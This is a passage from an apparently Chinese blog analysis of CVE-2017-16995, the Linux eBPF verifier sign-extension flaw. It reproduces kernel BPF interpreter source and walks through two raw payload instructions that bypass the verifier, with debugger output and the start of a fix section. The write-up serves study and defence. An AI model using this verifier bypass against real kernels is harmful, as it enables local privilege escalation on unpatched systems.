BPF_X] &#x3D; &amp;&amp;ALU64_ADD_X,</span><br><span class="line">        [BPF_ALU64 | BPF_ADD | BPF_K] &#x3D; &amp;&amp;ALU64_ADD_K,</span><br><span class="line">        [BPF_ALU64 | BPF_SUB | BPF_X] &#x3D; &amp;&amp;ALU64_SUB_X,</span><br><span class="line">        [BPF_ALU64 | BPF_SUB | BPF_K] &#x3D; &amp;&amp;ALU64_SUB_K,</span><br><span class="line">        [BPF_ALU64 | BPF_AND | BPF_X] &#x3D; &amp;&amp;ALU64_AND_X,</span><br><span class="line">        [BPF_ALU64 | BPF_AND | BPF_K] &#x3D; &amp;&amp;ALU64_AND_K,</span><br><span class="line">        [BPF_ALU64 | BPF_OR | BPF_X] &#x3D; &amp;&amp;ALU64_OR_X,</span><br><span class="line">        [BPF_ALU64 | BPF_OR | BPF_K] &#x3D; &amp;&amp;ALU64_OR_K,</span><br><span class="line">        [BPF_ALU64 | BPF_LSH | BPF_X] &#x3D; &amp;&amp;ALU64_LSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_LSH | BPF_K] &#x3D; &amp;&amp;ALU64_LSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_RSH | BPF_X] &#x3D; &amp;&amp;ALU64_RSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_RSH | BPF_K] &#x3D; &amp;&amp;ALU64_RSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_XOR | BPF_X] &#x3D; &amp;&amp;ALU64_XOR_X,</span><br><span class="line">        [BPF_ALU64 | BPF_XOR | BPF_K] &#x3D; &amp;&amp;ALU64_XOR_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MUL | BPF_X] &#x3D; &amp;&amp;ALU64_MUL_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MUL | BPF_K] &#x3D; &amp;&amp;ALU64_MUL_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MOV | BPF_X] &#x3D; &amp;&amp;ALU64_MOV_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MOV | BPF_K] &#x3D; &amp;&amp;ALU64_MOV_K,</span><br><span class="line">        [BPF_ALU64 | BPF_ARSH | BPF_X] &#x3D; &amp;&amp;ALU64_ARSH_X,</span><br><span class="line">        [BPF_ALU64 | BPF_ARSH | BPF_K] &#x3D; &amp;&amp;ALU64_ARSH_K,</span><br><span class="line">        [BPF_ALU64 | BPF_DIV | BPF_X] &#x3D; &amp;&amp;ALU64_DIV_X,</span><br><span class="line">        [BPF_ALU64 | BPF_DIV | BPF_K] &#x3D; &amp;&amp;ALU64_DIV_K,</span><br><span class="line">        [BPF_ALU64 | BPF_MOD | BPF_X] &#x3D; &amp;&amp;ALU64_MOD_X,</span><br><span class="line">        [BPF_ALU64 | BPF_MOD | BPF_K] &#x3D; &amp;&amp;ALU64_MOD_K,</span><br><span class="line">        [BPF_ALU64 | BPF_NEG] &#x3D; &amp;&amp;ALU64_NEG,</span><br><span class="line">        &#x2F;* Call instruction *&#x2F;</span><br><span class="line">        [BPF_JMP | BPF_CALL] &#x3D; &amp;&amp;JMP_CALL,</span><br><span class="line">        [BPF_JMP | BPF_CALL | BPF_X] &#x3D; &amp;&amp;JMP_TAIL_CALL,</span><br><span class="line">        &#x2F;* Jumps *&#x2F;</span><br><span class="line">        [BPF_JMP | BPF_JA] &#x3D; &amp;&amp;JMP_JA,</span><br><span class="line">        [BPF_JMP | BPF_JEQ | BPF_X] &#x3D; &amp;&amp;JMP_JEQ_X,</span><br><span class="line">        [BPF_JMP | BPF_JEQ | BPF_K] &#x3D; &amp;&amp;JMP_JEQ_K,</span><br><span class="line">        [BPF_JMP | BPF_JNE | BPF_X] &#x3D; &amp;&amp;JMP_JNE_X,</span><br><span class="line">        [BPF_JMP | BPF_JNE | BPF_K] &#x3D; &amp;&amp;JMP_JNE_K,</span><br><span class="line">        [BPF_JMP | BPF_JGT | BPF_X] &#x3D; &amp;&amp;JMP_JGT_X,</span><br><span class="line">        [BPF_JMP | BPF_JGT | BPF_K] &#x3D; &amp;&amp;JMP_JGT_K,</span><br><span class="line">        [BPF_JMP | BPF_JGE | BPF_X] &#x3D; &amp;&amp;JMP_JGE_X,</span><br><span class="line">        [BPF_JMP | BPF_JGE | BPF_K] &#x3D; &amp;&amp;JMP_JGE_K,</span><br><span class="line">        [BPF_JMP | BPF_JSGT | BPF_X] &#x3D; &amp;&amp;JMP_JSGT_X,</span><br><span class="line">        [BPF_JMP | BPF_JSGT | BPF_K] &#x3D; &amp;&amp;JMP_JSGT_K,</span><br><span class="line">        [BPF_JMP | BPF_JSGE | BPF_X] &#x3D; &amp;&amp;JMP_JSGE_X,</span><br><span class="line">        [BPF_JMP | BPF_JSGE | BPF_K] &#x3D; &amp;&amp;JMP_JSGE_K,</span><br><span class="line">        [BPF_JMP | BPF_JSET | BPF_X] &#x3D; &amp;&amp;JMP_JSET_X,</span><br><span class="line">        [BPF_JMP | BPF_JSET | BPF_K] &#x3D; &amp;&amp;JMP_JSET_K,</span><br><span class="line">        &#x2F;* Program return *&#x2F;</span><br><span class="line">        [BPF_JMP | BPF_EXIT] &#x3D; &amp;&amp;JMP_EXIT,</span><br><span class="line">        &#x2F;* Store instructions *&#x2F;</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_B] &#x3D; &amp;&amp;STX_MEM_B,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_H] &#x3D; &amp;&amp;STX_MEM_H,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_W] &#x3D; &amp;&amp;STX_MEM_W,</span><br><span class="line">        [BPF_STX | BPF_MEM | BPF_DW] &#x3D; &amp;&amp;STX_MEM_DW,</span><br><span class="line">        [BPF_STX | BPF_XADD | BPF_W] &#x3D; &amp;&amp;STX_XADD_W,</span><br><span class="line">        [BPF_STX | BPF_XADD | BPF_DW] &#x3D; &amp;&amp;STX_XADD_DW,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_B] &#x3D; &amp;&amp;ST_MEM_B,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_H] &#x3D; &amp;&amp;ST_MEM_H,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_W] &#x3D; &amp;&amp;ST_MEM_W,</span><br><span class="line">        [BPF_ST | BPF_MEM | BPF_DW] &#x3D; &amp;&amp;ST_MEM_DW,</span><br><span class="line">        &#x2F;* Load instructions *&#x2F;</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_B] &#x3D; &amp;&amp;LDX_MEM_B,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_H] &#x3D; &amp;&amp;LDX_MEM_H,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_W] &#x3D; &amp;&amp;LDX_MEM_W,</span><br><span class="line">        [BPF_LDX | BPF_MEM | BPF_DW] &#x3D; &amp;&amp;LDX_MEM_DW,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_W] &#x3D; &amp;&amp;LD_ABS_W,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_H] &#x3D; &amp;&amp;LD_ABS_H,</span><br><span class="line">        [BPF_LD | BPF_ABS | BPF_B] &#x3D; &amp;&amp;LD_ABS_B,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_W] &#x3D; &amp;&amp;LD_IND_W,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_H] &#x3D; &amp;&amp;LD_IND_H,</span><br><span class="line">        [BPF_LD | BPF_IND | BPF_B] &#x3D; &amp;&amp;LD_IND_B,</span><br><span class="line">        [BPF_LD | BPF_IMM | BPF_DW] &#x3D; &amp;&amp;LD_IMM_DW,</span><br><span class="line">    &#125;;</span><br><span class="line">    u32 tail_call_cnt &#x3D; 0;</span><br><span class="line">    void *ptr;</span><br><span class="line">    int off;</span><br><span class="line"></span><br><span class="line">#define CONT     (&#123; insn++; goto select_insn; &#125;)</span><br><span class="line">#define CONT_JMP (&#123; insn++; goto select_insn; &#125;)</span><br><span class="line"></span><br><span class="line">    FP &#x3D; (u64) (unsigned long) &amp;stack[ARRAY_SIZE(stack)];</span><br><span class="line">    ARG1 &#x3D; (u64) (unsigned long) ctx;</span><br><span class="line"></span><br><span class="line">select_insn:</span><br><span class="line">    goto *jumptable[insn-&gt;code];</span><br><span class="line"></span><br><span class="line">    &#x2F;* ALU *&#x2F;</span><br><span class="line">#define ALU(OPCODE, OP)            \</span><br><span class="line">    ALU64_##OPCODE##_X:        \</span><br><span class="line">        DST &#x3D; DST OP SRC;    \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU_##OPCODE##_X:        \</span><br><span class="line">        DST &#x3D; (u32) DST OP (u32) SRC;    \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU64_##OPCODE##_K:        \</span><br><span class="line">        DST &#x3D; DST OP IMM;        \</span><br><span class="line">        CONT;            \</span><br><span class="line">    ALU_##OPCODE##_K:        \</span><br><span class="line">        DST &#x3D; (u32) DST OP (u32) IMM;    \</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    ALU(ADD,  +)</span><br><span class="line">    ALU(SUB,  -)</span><br><span class="line">    ALU(AND,  &amp;)</span><br><span class="line">    ALU(OR,   |)</span><br><span class="line">    ALU(LSH, &lt;&lt;)</span><br><span class="line">    ALU(RSH, &gt;&gt;)</span><br><span class="line">    ALU(XOR,  ^)</span><br><span class="line">    ALU(MUL,  *)</span><br><span class="line">#undef ALU</span><br><span class="line">    ALU_NEG:</span><br><span class="line">        DST &#x3D; (u32) -DST;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_NEG:</span><br><span class="line">        DST &#x3D; -DST;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOV_X:</span><br><span class="line">        DST &#x3D; (u32) SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOV_K:</span><br><span class="line">        DST &#x3D; (u32) IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOV_X:</span><br><span class="line">        DST &#x3D; SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOV_K:</span><br><span class="line">        DST &#x3D; IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    LD_IMM_DW:</span><br><span class="line">        DST &#x3D; (u64) (u32) insn[0].imm | ((u64) (u32) insn[1].imm) &lt;&lt; 32;</span><br><span class="line">        insn++;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_ARSH_X:</span><br><span class="line">        (*(s64 *) &amp;DST) &gt;&gt;&#x3D; SRC;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_ARSH_K:</span><br><span class="line">        (*(s64 *) &amp;DST) &gt;&gt;&#x3D; IMM;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOD_X:</span><br><span class="line">        if (unlikely(SRC &#x3D;&#x3D; 0))</span><br><span class="line">            return 0;</span><br><span class="line">        div64_u64_rem(DST, SRC, &amp;tmp);</span><br><span class="line">        DST &#x3D; tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOD_X:</span><br><span class="line">        if (unlikely(SRC &#x3D;&#x3D; 0))</span><br><span class="line">            return 0;</span><br><span class="line">        tmp &#x3D; (u32) DST;</span><br><span class="line">        DST &#x3D; do_div(tmp, (u32) SRC);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_MOD_K:</span><br><span class="line">        div64_u64_rem(DST, IMM, &amp;tmp);</span><br><span class="line">        DST &#x3D; tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_MOD_K:</span><br><span class="line">        tmp &#x3D; (u32) DST;</span><br><span class="line">        DST &#x3D; do_div(tmp, (u32) IMM);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_DIV_X:</span><br><span class="line">        if (unlikely(SRC &#x3D;&#x3D; 0))</span><br><span class="line">            return 0;</span><br><span class="line">        DST &#x3D; div64_u64(DST, SRC);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_DIV_X:</span><br><span class="line">        if (unlikely(SRC &#x3D;&#x3D; 0))</span><br><span class="line">            return 0;</span><br><span class="line">        tmp &#x3D; (u32) DST;</span><br><span class="line">        do_div(tmp, (u32) SRC);</span><br><span class="line">        DST &#x3D; (u32) tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU64_DIV_K:</span><br><span class="line">        DST &#x3D; div64_u64(DST, IMM);</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_DIV_K:</span><br><span class="line">        tmp &#x3D; (u32) DST;</span><br><span class="line">        do_div(tmp, (u32) IMM);</span><br><span class="line">        DST &#x3D; (u32) tmp;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_END_TO_BE:</span><br><span class="line">        switch (IMM) &#123;</span><br><span class="line">        case 16:</span><br><span class="line">            DST &#x3D; (__force u16) cpu_to_be16(DST);</span><br><span class="line">            break;</span><br><span class="line">        case 32:</span><br><span class="line">            DST &#x3D; (__force u32) cpu_to_be32(DST);</span><br><span class="line">            break;</span><br><span class="line">        case 64:</span><br><span class="line">            DST &#x3D; (__force u64) cpu_to_be64(DST);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    ALU_END_TO_LE:</span><br><span class="line">        switch (IMM) &#123;</span><br><span class="line">        case 16:</span><br><span class="line">            DST &#x3D; (__force u16) cpu_to_le16(DST);</span><br><span class="line">            break;</span><br><span class="line">        case 32:</span><br><span class="line">            DST &#x3D; (__force u32) cpu_to_le32(DST);</span><br><span class="line">            break;</span><br><span class="line">        case 64:</span><br><span class="line">            DST &#x3D; (__force u64) cpu_to_le64(DST);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    &#x2F;* CALL *&#x2F;</span><br><span class="line">    JMP_CALL:</span><br><span class="line">        &#x2F;* Function call scratches BPF_R1-BPF_R5 registers,</span><br><span class="line">         * preserves BPF_R6-BPF_R9, and stores return value</span><br><span class="line">         * into BPF_R0.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        BPF_R0 &#x3D; (__bpf_call_base + insn-&gt;imm)(BPF_R1, BPF_R2, BPF_R3,</span><br><span class="line">                               BPF_R4, BPF_R5);</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    JMP_TAIL_CALL: &#123;</span><br><span class="line">        struct bpf_map *map &#x3D; (struct bpf_map *) (unsigned long) BPF_R2;</span><br><span class="line">        struct bpf_array *array &#x3D; container_of(map, struct bpf_array, map);</span><br><span class="line">        struct bpf_prog *prog;</span><br><span class="line">        u64 index &#x3D; BPF_R3;</span><br><span class="line"></span><br><span class="line">        if (unlikely(index &gt;&#x3D; array-&gt;map.max_entries))</span><br><span class="line">            goto out;</span><br><span class="line"></span><br><span class="line">        if (unlikely(tail_call_cnt &gt; MAX_TAIL_CALL_CNT))</span><br><span class="line">            goto out;</span><br><span class="line"></span><br><span class="line">        tail_call_cnt++;</span><br><span class="line"></span><br><span class="line">        prog &#x3D; READ_ONCE(array-&gt;ptrs[index]);</span><br><span class="line">        if (unlikely(!prog))</span><br><span class="line">            goto out;</span><br><span class="line"></span><br><span class="line">        &#x2F;* ARG1 at this point is guaranteed to point to CTX from</span><br><span class="line">         * the verifier side due to the fact that the tail call is</span><br><span class="line">         * handeled like a helper, that is, bpf_tail_call_proto,</span><br><span class="line">         * where arg1_type is ARG_PTR_TO_CTX.</span><br><span class="line">         *&#x2F;</span><br><span class="line">        insn &#x3D; prog-&gt;insnsi;</span><br><span class="line">        goto select_insn;</span><br><span class="line">out:</span><br><span class="line">        CONT;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* JMP *&#x2F;</span><br><span class="line">    JMP_JA:</span><br><span class="line">        insn +&#x3D; insn-&gt;off;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JEQ_X:</span><br><span class="line">        if (DST &#x3D;&#x3D; SRC) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JEQ_K:</span><br><span class="line">        if (DST &#x3D;&#x3D; IMM) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JNE_X:</span><br><span class="line">        if (DST !&#x3D; SRC) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JNE_K:</span><br><span class="line">        if (DST !&#x3D; IMM) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGT_X:</span><br><span class="line">        if (DST &gt; SRC) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGT_K:</span><br><span class="line">        if (DST &gt; IMM) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGE_X:</span><br><span class="line">        if (DST &gt;&#x3D; SRC) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JGE_K:</span><br><span class="line">        if (DST &gt;&#x3D; IMM) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGT_X:</span><br><span class="line">        if (((s64) DST) &gt; ((s64) SRC)) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGT_K:</span><br><span class="line">        if (((s64) DST) &gt; ((s64) IMM)) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGE_X:</span><br><span class="line">        if (((s64) DST) &gt;&#x3D; ((s64) SRC)) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSGE_K:</span><br><span class="line">        if (((s64) DST) &gt;&#x3D; ((s64) IMM)) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSET_X:</span><br><span class="line">        if (DST &amp; SRC) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_JSET_K:</span><br><span class="line">        if (DST &amp; IMM) &#123;</span><br><span class="line">            insn +&#x3D; insn-&gt;off;</span><br><span class="line">            CONT_JMP;</span><br><span class="line">        &#125;</span><br><span class="line">        CONT;</span><br><span class="line">    JMP_EXIT:</span><br><span class="line">        return BPF_R0;</span><br><span class="line"></span><br><span class="line">    &#x2F;* STX and ST and LDX*&#x2F;</span><br><span class="line">#define LDST(SIZEOP, SIZE)                        \</span><br><span class="line">    STX_MEM_##SIZEOP:                        \</span><br><span class="line">        *(SIZE *)(unsigned long) (DST + insn-&gt;off) &#x3D; SRC;    \</span><br><span class="line">        CONT;                            \</span><br><span class="line">    ST_MEM_##SIZEOP:                        \</span><br><span class="line">        *(SIZE *)(unsigned long) (DST + insn-&gt;off) &#x3D; IMM;    \</span><br><span class="line">        CONT;                            \</span><br><span class="line">    LDX_MEM_##SIZEOP:                        \</span><br><span class="line">        DST &#x3D; *(SIZE *)(unsigned long) (SRC + insn-&gt;off);    \</span><br><span class="line">        CONT;</span><br><span class="line"></span><br><span class="line">    LDST(B,   u8)</span><br><span class="line">    LDST(H,  u16)</span><br><span class="line">    LDST(W,  u32)</span><br><span class="line">    LDST(DW, u64)</span><br><span class="line">#undef LDST</span><br><span class="line">    STX_XADD_W: &#x2F;* lock xadd *(u32 *)(dst_reg + off16) +&#x3D; src_reg *&#x2F;</span><br><span class="line">        atomic_add((u32) SRC, (atomic_t *)(unsigned long)</span><br><span class="line">               (DST + insn-&gt;off));</span><br><span class="line">        CONT;</span><br><span class="line">    STX_XADD_DW: &#x2F;* lock xadd *(u64 *)(dst_reg + off16) +&#x3D; src_reg *&#x2F;</span><br><span class="line">        atomic64_add((u64) SRC, (atomic64_t *)(unsigned long)</span><br><span class="line">                 (DST + insn-&gt;off));</span><br><span class="line">        CONT;</span><br><span class="line">    LD_ABS_W: &#x2F;* BPF_R0 &#x3D; ntohl(*(u32 *) (skb-&gt;data + imm32)) *&#x2F;</span><br><span class="line">        off &#x3D; IMM;</span><br><span class="line">load_word:</span><br><span class="line">        &#x2F;* BPF_LD + BPD_ABS and BPF_LD + BPF_IND insns are</span><br><span class="line">         * only appearing in the programs where ctx &#x3D;&#x3D;</span><br><span class="line">         * skb. All programs keep &#39;ctx&#39; in regs[BPF_REG_CTX]</span><br><span class="line">         * &#x3D;&#x3D; BPF_R6, bpf_convert_filter() saves it in BPF_R6,</span><br><span class="line">         * internal BPF verifier will check that BPF_R6 &#x3D;&#x3D;</span><br><span class="line">         * ctx.</span><br><span class="line">         *</span><br><span class="line">         * BPF_ABS and BPF_IND are wrappers of function calls,</span><br><span class="line">         * so they scratch BPF_R1-BPF_R5 registers, preserve</span><br><span class="line">         * BPF_R6-BPF_R9, and store return value into BPF_R0.</span><br><span class="line">         *</span><br><span class="line">         * Implicit input:</span><br><span class="line">         *   ctx &#x3D;&#x3D; skb &#x3D;&#x3D; BPF_R6 &#x3D;&#x3D; CTX</span><br><span class="line">         *</span><br><span class="line">         * Explicit input:</span><br><span class="line">         *   SRC &#x3D;&#x3D; any register</span><br><span class="line">         *   IMM &#x3D;&#x3D; 32-bit immediate</span><br><span class="line">         *</span><br><span class="line">         * Output:</span><br><span class="line">         *   BPF_R0 - 8&#x2F;16&#x2F;32-bit skb data converted to cpu endianness</span><br><span class="line">         *&#x2F;</span><br><span class="line"></span><br><span class="line">        ptr &#x3D; bpf_load_pointer((struct sk_buff *) (unsigned long) CTX, off, 4, &amp;tmp);</span><br><span class="line">        if (likely(ptr !&#x3D; NULL)) &#123;</span><br><span class="line">            BPF_R0 &#x3D; get_unaligned_be32(ptr);</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">    LD_ABS_H: &#x2F;* BPF_R0 &#x3D; ntohs(*(u16 *) (skb-&gt;data + imm32)) *&#x2F;</span><br><span class="line">        off &#x3D; IMM;</span><br><span class="line">load_half:</span><br><span class="line">        ptr &#x3D; bpf_load_pointer((struct sk_buff *) (unsigned long) CTX, off, 2, &amp;tmp);</span><br><span class="line">        if (likely(ptr !&#x3D; NULL)) &#123;</span><br><span class="line">            BPF_R0 &#x3D; get_unaligned_be16(ptr);</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">    LD_ABS_B: &#x2F;* BPF_R0 &#x3D; *(u8 *) (skb-&gt;data + imm32) *&#x2F;</span><br><span class="line">        off &#x3D; IMM;</span><br><span class="line">load_byte:</span><br><span class="line">        ptr &#x3D; bpf_load_pointer((struct sk_buff *) (unsigned long) CTX, off, 1, &amp;tmp);</span><br><span class="line">        if (likely(ptr !&#x3D; NULL)) &#123;</span><br><span class="line">            BPF_R0 &#x3D; *(u8 *)ptr;</span><br><span class="line">            CONT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">    LD_IND_W: &#x2F;* BPF_R0 &#x3D; ntohl(*(u32 *) (skb-&gt;data + src_reg + imm32)) *&#x2F;</span><br><span class="line">        off &#x3D; IMM + SRC;</span><br><span class="line">        goto load_word;</span><br><span class="line">    LD_IND_H: &#x2F;* BPF_R0 &#x3D; ntohs(*(u16 *) (skb-&gt;data + src_reg + imm32)) *&#x2F;</span><br><span class="line">        off &#x3D; IMM + SRC;</span><br><span class="line">        goto load_half;</span><br><span class="line">    LD_IND_B: &#x2F;* BPF_R0 &#x3D; *(u8 *) (skb-&gt;data + src_reg + imm32) *&#x2F;</span><br><span class="line">        off &#x3D; IMM + SRC;</span><br><span class="line">        goto load_byte;</span><br><span class="line"></span><br><span class="line">    default_label:</span><br><span class="line">        &#x2F;* If we ever reach this, we have a bug somewhere. *&#x2F;</span><br><span class="line">        WARN_RATELIMIT(1, &quot;unknown opcode %02x\n&quot;, insn-&gt;code);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是老样子，从第一行payload <code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>开始看</p>
<p>这一句payload在真实执行中，将会跳转到以下标签</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALU_MOV_K:</span><br><span class="line">DST &#x3D; (u32) IMM;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure>
<p>也即将立即数(IMM)赋值给寄存器</p>
<p>这里我们要尤其关注<code>DST</code>以及<code>IMM</code>的类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define DST    regs[insn-&gt;dst_reg]</span><br><span class="line">#define IMM    insn-&gt;imm</span><br><span class="line">......</span><br><span class="line">u64 regs[MAX_BPF_REG], tmp;</span><br></pre></td></tr></table></figure>
<p>从上面可以看到,<code>DST</code>为无符号64位整型，而<code>IMM</code>，则是有符号32位整型</p>
<p>经过<code>DST = (u32) IMM;</code>语句，<code>IMM</code>被强转为无符号32位整型并赋值给<code>DST</code></p>
<p>但是，由于<code>DST</code>为无符号64位整型，所以<code>IMM</code>需要扩展为64位才可赋值，由于此时<code>IMM</code>为无符号整型，所以原来的<code>0xffffffff</code>将会被拓展为<code>0x00000000ffffffff</code>并赋值给<code>DST</code></p>
<p>接着我们来看第二句payload<code>\x55\x09\x02\x00\xff\xff\xff\xff</code></p>
<p>这一句payload将会跳转至以下标签</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JMP_JNE_K:</span><br><span class="line">if (DST !&#x3D; IMM) &#123;</span><br><span class="line">    insn +&#x3D; insn-&gt;off;</span><br><span class="line">    CONT_JMP;</span><br><span class="line">&#125;</span><br><span class="line">CONT;</span><br></pre></td></tr></table></figure>
<p>也即判断<code>DST</code>是否等于<code>IMM</code>，那么如果你还记得，在虚拟执行中，这两个值是相等的，所以并不会执行跳转，后续执行第三、四句payload，从而退出bpf指令的执行</p>
<p>但是，在真实的执行中，却出现了一点问题</p>
<p>我们同样关注<code>DST</code>以及<code>IMM</code>的类型</p>
<p>此时，<code>DST</code>仍为无符号64位整型，而<code>IMM</code>，也仍是有符号32位整型</p>
<p>接着判断两个值是否相等<code>DST != IMM</code>，此时<code>DST</code>为<code>0x00000000ffffffff</code>，而<code>IMM</code>却由于是有符号32位整型，所以需要先拓展为64位才可以进行比较</p>
<p>那么<code>IMM</code>将会如何扩展呢？</p>
<p>由于<code>IMM</code>为带符号整型，所以原来<code>0xffffffff</code>将会被拓展为<code>0xffffffffffffffff</code></p>
<p>那么，由于<code>0x00000000ffffffff != 0xffffffffffffffff</code>，故而执行跳转，执行了本不该执行的，虚拟执行中未进行检查的我们的payload的剩余部分</p>
<p>看到这儿，相信原理已经十分清楚了，此漏洞就是由于内核不当的符号拓展导致了bpf解释器在虚拟执行以及真实执行时的解释存在差异，从而使得未经安全检查的bpf指令得以绕过bpf虚拟执行中的检查，被内核真实加载并执行</p>
<p>附上debug图</p>
<p>执行判断语句</p>
<p><img src="/image/CVE-2017-16995/DST.png" alt="DST"></p>
<p>可以看到此时恰好是漏洞的触发点，将要执行比较<code>DST</code>以及<code>IMM</code>的值</p>
<p>此时<code>DST</code>的值为<code>$rbp+$rax*8-0x278</code>处的值，可以看到是<code>0x00000000ffffffff</code></p>
<p>此时<code>IMM</code>的值为<code>rdx</code>寄存器的值，如下图所示</p>
<p><img src="/image/CVE-2017-16995/IMM.png" alt="IMM"></p>
<p>可以看到为<code>0xffffffffffffffff</code></p>
<p>同时，你也可以看到<code>&lt;__bpf_prog_run+2265&gt; movsxd rdx, DWORD PTR [rbx+0x4]</code>，此句便是执行了<code>IMM</code>的带符号拓展至64位的操作</p>
<p>最终由于两值不相等，从而进入了不该进入的分支，从而执行了未经校验的bpf指令</p>
<p><img src="/image/CVE-2017-16995/pwn.png" alt="pwn"></p>
<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>此漏洞在如今的linux内核中已经被修复，来看看<code>linux-4.15</code>版本中如何修复此问题</p>
<p>主要的修复工作是在<code>check_alu_op</code>函数中做的，其中虚拟执行过程中的许多结构体经过了大改，所以简单叙述一下</p>
